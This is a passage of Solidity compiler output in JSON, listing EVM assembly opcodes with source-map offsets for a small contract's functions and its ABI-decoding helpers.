											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 533,
											"end": 544,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 497,
											"end": 552,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 327,
											"end": 489,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 387,
											"end": 392,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 380,
											"end": 384,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 380,
											"end": 384,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 380,
											"end": 392,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 380,
											"end": 392,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 380,
											"end": 392,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 380,
											"end": 392,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 405,
											"end": 415,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 405,
											"end": 420,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 405,
											"end": 420,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 405,
											"end": 424,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 405,
											"end": 424,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 445,
											"end": 449,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 445,
											"end": 449,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 445,
											"end": 449,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 445,
											"end": 449,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 445,
											"end": 449,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 445,
											"end": 449,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 445,
											"end": 449,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 445,
											"end": 449,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 445,
											"end": 449,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 445,
											"end": 449,
											"name": "PUSH",
											"source": 0,
											"value": "FF"
										},
										{
											"begin": 445,
											"end": 449,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 437,
											"end": 450,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 437,
											"end": 450,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 437,
											"end": 450,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 437,
											"end": 450,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 437,
											"end": 450,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 437,
											"end": 450,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 437,
											"end": 450,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 461,
											"end": 468,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 474,
											"end": 480,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 461,
											"end": 481,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 461,
											"end": 481,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 327,
											"end": 489,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "tag",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 278,
											"end": 302,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 278,
											"end": 302,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 88,
											"end": 205,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 197,
											"end": 198,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 194,
											"end": 195,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 187,
											"end": 199,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 334,
											"end": 460,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 371,
											"end": 378,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 411,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 404,
											"end": 409,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 400,
											"end": 454,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 389,
											"end": 454,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 389,
											"end": 454,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 334,
											"end": 460,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 466,
											"end": 562,
											"name": "tag",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 466,
											"end": 562,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 503,
											"end": 510,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 550,
											"end": 555,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 532,
											"end": 556,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "tag",
											"source": 1,
											"value": "49"
										},
										{
											"begin": 532,
											"end": 556,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 521,
											"end": 556,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 521,
											"end": 556,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 466,
											"end": 562,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 466,
											"end": 562,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 466,
											"end": 562,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 568,
											"end": 690,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 568,
											"end": 690,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 659,
											"end": 664,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 641,
											"end": 665,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "33"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "tag",
											"source": 1,
											"value": "51"
										},
										{
											"begin": 641,
											"end": 665,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 634,
											"end": 639,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 631,
											"end": 666,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 621,
											"end": 684,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 680,
											"end": 681,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 677,
											"end": 678,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 670,
											"end": 682,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 621,
											"end": 684,
											"name": "tag",
											"source": 1,
											"value": "52"
										},
										{
											"begin": 621,
											"end": 684,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 568,
											"end": 690,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 568,
											"end": 690,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 696,
											"end": 835,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 696,
											"end": 835,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 742,
											"end": 747,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 780,
											"end": 786,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 767,
											"end": 787,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 758,
											"end": 787,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 758,
											"end": 787,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 823,
											"end": 828,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 796,
											"end": 829,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 796,
											"end": 829,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 696,
											"end": 835,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 900,
											"end": 906,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 949,
											"end": 951,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 937,
											"end": 946,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 928,
											"end": 935,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 924,
											"end": 947,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 920,
											"end": 952,
											"name": "SLT",
											"source": 1
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "57"
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "tag",
											"source": 1,
											"value": "57"
										},
										{
											"begin": 955,
											"end": 1034,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "tag",
											"source": 1,
											"value": "56"
										},
										{
											"begin": 917,
											"end": 1036,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1075,
											"end": 1076,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1145,
											"end": 1152,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1136,
											"end": 1142,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1125,
											"end": 1134,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1121,
											"end": 1143,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1100,
											"end": 1153,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1090,
											"end": 1153,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1090,
											"end": 1153,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1046,
											"end": 1163,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 841,
											"end": 1170,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "tag",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1213,
											"end": 1220,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1242,
											"end": 1247,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1231,
											"end": 1247,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1231,
											"end": 1247,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1176,
											"end": 1253,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1259,
											"end": 1381,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1259,
											"end": 1381,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1350,
											"end": 1355,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "36"
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "tag",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1332,
											"end": 1356,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1325,
											"end": 1330,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1322,
											"end": 1357,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1312,
											"end": 1375,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1312,
											"end": 1375,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1371,
											"end": 1372,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1368,
											"end": 1369,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1361,
											"end": 1373,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1312,
											"end": 1375,
											"name": "tag",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 1312,
											"end": 1375,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1259,
											"end": 1381,
											"name": "POP",
											"source": 1
